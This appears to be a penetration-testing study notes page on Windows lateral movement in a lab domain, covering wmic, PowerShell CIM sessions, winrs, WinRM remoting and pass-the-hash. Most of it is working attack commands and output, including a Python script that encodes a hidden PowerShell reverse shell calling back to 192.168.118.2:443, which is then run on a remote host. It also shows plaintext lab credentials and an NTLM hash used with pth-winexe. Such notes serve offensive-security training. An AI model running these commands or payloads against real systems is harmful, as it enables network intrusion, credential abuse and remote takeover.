# Lateral movement

## WMI and WinRM

### wmic

{% code title="Running the wmic utility to spawn a process on a remote system." overflow="wrap" lineNumbers="true" %}
```
C:\Users\jeff>wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 752;
        ReturnValue = 0;
};
```
{% endcode %}

### Powershell

{% code title="Creating a new CimSession and nvoking the WMI session through PowerShell" overflow="wrap" lineNumbers="true" %}
```
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
$command = 'calc';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```
{% endcode %}

{% code title="Executing the WMI PowerShell payload." overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\jeff> $username = 'jen';
...
PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     3712           0 192.168.50.73
```
{% endcode %}

{% code title="Executing the WMI PowerShell payload." overflow="wrap" lineNumbers="true" %}
```
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```
{% endcode %}

{% code title="Running the base64 encoder Python script" overflow="wrap" lineNumbers="true" %}
```
kali@kali:~$ python3 encode.py
powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAU...
OwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```
{% endcode %}

{% code title="Executing the WMI payload with base64 reverse shell" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\jeff> $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';

PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     3948           0 192.168.50.73

```
{% endcode %}

### winrs

{% hint style="info" %}
For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.
{% endhint %}

{% code title="Executing commands remotely via WinRS" overflow="wrap" lineNumbers="true" %}
```
C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
FILES04
corp\jen
```
{% endcode %}

{% code title="Running the reverse-shell payload through WinRS" overflow="wrap" lineNumbers="true" %}
```
C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```
{% endcode %}

### WinRM - Powershell remoting

{% code title="Establishing a PowerShell Remote Session via WinRM" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          192.168.50.73   RemoteMachine   Opened        Microsoft.PowerShell     Available

```
{% endcode %}

{% code title="Inspecting the PowerShell Remoting session" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\jeff> Enter-PSSession 1
[192.168.50.73]: PS C:\Users\jen\Documents> whoami
corp\jen

[192.168.50.73]: PS C:\Users\jen\Documents> hostname
FILES04

```
{% endcode %}

## Pass the hash

PTH only works for NTLM authentication, not for Kerberos authentication.

Tools: PsExec (Metasploit), [https://github.com/byt3bl33d3r/pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit) or [ https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py](https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py)



Pth-winexe

```
kali@kali:~$ pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2
eb3b9f05c425e //10.11.0.22 cmd
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.16299.309]
(c) 2017 Microsoft Corporation. All rights reserved.
C:\Windows\system32>
```

## Overpass the Hash

NTLM to --> Kerberos TGT ticket

With overpass the hash,673 we can “over” abuse a NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT) or service ticket, which grants us access to another machine or service as that user.



## Pass the ticket

In the previous section, we used the overpass the hash technique (along with the captured NTLM hash) to acquire a Kerberos TGT, allowing us to authenticate using Kerberos. We can only use the TGT on the machine it was created for, but the TGS potentially offers more flexibility. The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.

Mimikatz can craft a silver ticket and inject it straight into memory through the (somewhat misleading) kerberos::golden676 command. We will explain this apparent misnaming later in the module.

## Distributed Component Object Model (DCOM)

{% hint style="info" %}
There are two other well-known lateral movement techniques worth mentioning: abusing Windows Management Instrumentation680 and a technique known as PowerShell Remoting.
{% endhint %}

Takes advantage of Office.
